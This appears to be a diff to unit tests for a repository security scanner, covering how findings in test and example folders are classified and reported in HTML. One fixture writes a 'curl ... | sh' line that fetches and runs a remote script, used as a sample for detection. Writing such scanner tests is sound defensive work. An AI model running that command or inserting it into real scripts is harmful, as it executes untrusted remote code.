@@ -69,6 +69,10 @@ class SectionTests(unittest.TestCase):
             ("tests/test_app.py", "PY004", None, "tests"),
             ("src/app.test.ts", "JS002", None, "tests"),
             ("pkg/x_test.go", "GO001", None, "tests"),
+            ("tests/fixtures/package.json", "DEP004", None, "tests"),
+            ("tests/corpus/.github/workflows/x.yml", "GHA002", None, "tests"),
+            ("examples/app/.vscode/tasks.json", "AUTO001", None, "tests"),
+            ("examples/app/uv.lock", "VULN001", None, "deps"),
             ("uv.lock", "VULN001", None, "deps"),
             (".github/workflows/ci.yml", "GHA003", None, "ci"),
             ("config.py", "SEC001", None, "secrets"),
@@ -82,7 +86,10 @@ class VerdictTests(unittest.TestCase):
         self.assertEqual(check.verdict([])[0], "clear")
         self.assertEqual(check.verdict([finding("src/app.py", "PY002")])[0], "review")
         self.assertEqual(check.verdict([finding("tests/test_x.py", "PY004")])[0], "clear")
-        self.assertEqual(check.verdict([finding("tests/helper.py", "NET001")])[0], "danger")
+        self.assertEqual(check.verdict([finding("src/helper.py", "NET001")])[0], "danger")
+        # Strong signs in tests and examples ask for review; manifests there do not run on install.
+        self.assertEqual(check.verdict([finding("tests/helper.py", "NET001")])[0], "review")
+        self.assertEqual(check.verdict([finding("tests/fixtures/package.json", "DEP004")])[0], "clear")
         self.assertEqual(check.verdict([finding("package.json", "DEP004")])[0], "danger")
         self.assertEqual(check.verdict([finding("package.json", "DEP003")])[0], "review")
         self.assertEqual(check.verdict([finding("uv.lock", "MAL001")])[0], "danger")
@@ -168,6 +175,17 @@ class RunTests(unittest.TestCase):
         self.assertIn('class="row hit-high"', out)  # the postinstall line is highlighted
         self.assertIn('<li class="t-clean"><span class="dot"></span>README.md</li>', out)
         self.assertIn("DANGER", out)
+
+    def test_html_report_sets_tests_apart(self):
+        (self.root / "tests").mkdir()
+        (self.root / "tests" / "install.sh").write_text("#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | sh\n")
+        (self.root / "app.py").write_text("import os\nos.system(cmd)\n")
+        code, out, _err = self.run_check(use_osv=False, output_format="html")
+        self.assertEqual(code, 1)
+        self.assertIn('<details class="t-sample"><summary>', out)  # closed by default
+        self.assertIn('<section class="file sample"', out)
+        self.assertLess(out.index('id="f0"'), out.index('<section class="file sample"'))  # app.py comes first
+        self.assertIn('class="card s-sample"', out)
 
     def test_html_report_to_file_with_dependencies(self):
         (self.root / "Cargo.lock").write_text('[[package]]\nname = "time"\nversion = "0.1.43"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n')
